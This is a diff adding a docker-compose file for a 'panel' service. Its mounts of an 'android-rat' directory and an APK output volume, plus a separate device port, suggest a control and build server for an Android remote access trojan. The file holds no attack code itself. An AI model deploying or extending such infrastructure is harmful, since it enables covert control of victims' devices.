@@ -1,0 +1,22 @@
+version: "3.9"
+
+services:
+  panel:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    restart: unless-stopped
+    ports:
+      - "${PORT:-3001}:3001"
+      - "${DEVICE_PORT:-3002}:3002"
+    env_file:
+      - .env
+    volumes:
+      - apk_output:/app/backend/apk-output
+      - ./android-rat:/app/android-rat:ro
+      - ./certs:/app/backend/certs:ro
+    environment:
+      - NODE_ENV=production
+
+volumes:
+  apk_output:
